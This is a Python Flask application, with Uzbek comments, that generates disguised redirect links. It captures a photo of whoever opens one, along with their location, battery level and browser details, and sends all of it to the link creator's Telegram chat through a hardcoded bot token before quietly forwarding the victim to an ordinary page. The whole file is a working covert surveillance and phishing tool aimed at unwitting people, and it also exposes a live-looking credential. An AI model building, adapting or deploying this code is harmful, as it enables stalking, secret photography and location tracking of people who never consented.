from flask import Flask, request, render_template, redirect, url_for, send_from_directory
from werkzeug.utils import secure_filename
import os, uuid, sqlite3, requests, platform, json

app = Flask(__name__)
app.config['UPLOAD_FOLDER'] = 'static/uploads'
os.makedirs(app.config['UPLOAD_FOLDER'], exist_ok=True)

# --- SQLite bazasi ---
def init_db():
    conn = sqlite3.connect('data.db')
    c = conn.cursor()
    c.execute('''
        CREATE TABLE IF NOT EXISTS redirects (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            code TEXT UNIQUE,
            target_url TEXT,
            telegram_id TEXT
        )
    ''')
    conn.commit()
    conn.close()

init_db()

# --- Home page /secretpage ---
@app.route('/secretpage', methods=['GET'])
def secret_page():
    return render_template('index.html')

# --- Generate maxfiy link ---
@app.route('/generate', methods=['POST'])
def generate():
    target_url = request.form['target_url']
    telegram_id = request.form['telegram_id']
    code = str(uuid.uuid4())[:8]

    conn = sqlite3.connect('data.db')
    c = conn.cursor()
    c.execute("INSERT INTO redirects (code, target_url, telegram_id) VALUES (?, ?, ?)",
              (code, target_url, telegram_id))
    conn.commit()
    conn.close()

    full_link = request.host_url + 'r/' + code
    return render_template('generated.html', link=full_link)

# --- Maxfiy linkni ochgan payt ---
@app.route('/r/<code>', methods=['GET', 'POST'])
def redirect_with_capture(code):
    conn = sqlite3.connect('data.db')
    c = conn.cursor()
    c.execute("SELECT target_url, telegram_id FROM redirects WHERE code=?", (code,))
    row = c.fetchone()
    conn.close()

    if not row:
        return "Link mavjud emas", 404

    target_url, telegram_id = row

    if request.method == 'POST':
        # Rasmni saqlash
        image = request.files['image']
        filename = secure_filename(str(uuid.uuid4()) + '.jpg')
        filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
        image.save(filepath)

        # Qurilma ma'lumotlari
        user_agent = request.headers.get('User-Agent', 'Noma’lum')
        system_info = f"Platforma: {platform.system()} | Brauzer: {user_agent}"

        battery_level = request.form.get("battery", "Noma’lum")
        location = request.form.get("location", "Noma’lum")

        # Telegramga yuborish
        bot_token = '8030649119:AAHOPCZMqvwxrxJ0EPrxkiiYNrJI2l-RKmI'
        # caption = f"📸 Rasm yuborildi:\n\n🔗 Link: /r/{code}\n🖥 Qurilma: {user_agent}"
        caption = (
            "📸 *Yangi rasm yuborildi!*\n\n"
            f"🔗 *Link:* [O‘tish](/r/{code})\n"
            f"🖥 *Qurilma:* {user_agent}\n"
            f"🔋 *Batareya:* {battery_level if battery_level else 'Noma’lum'}%\n"
            f"📍 *Lokatsiya:* {location if location else 'Noma’lum joylashuv'}"
        )
        send_url = f'https://api.telegram.org/bot{bot_token}/sendPhoto'
        with open(filepath, 'rb') as photo:
            requests.post(send_url, data={
                'chat_id': telegram_id,
                'caption': caption
            }, files={'photo': photo})

        return redirect(target_url)

    return render_template('camera.html', code=code)

# --- Rasmni ko‘rsatish ---
@app.route('/static/uploads/<filename>')
def uploaded_file(filename):
    return send_from_directory(app.config['UPLOAD_FOLDER'], filename)

# --- Run ---
if __name__ == '__main__':
    app.run(host="0.0.0.0", port=5000)

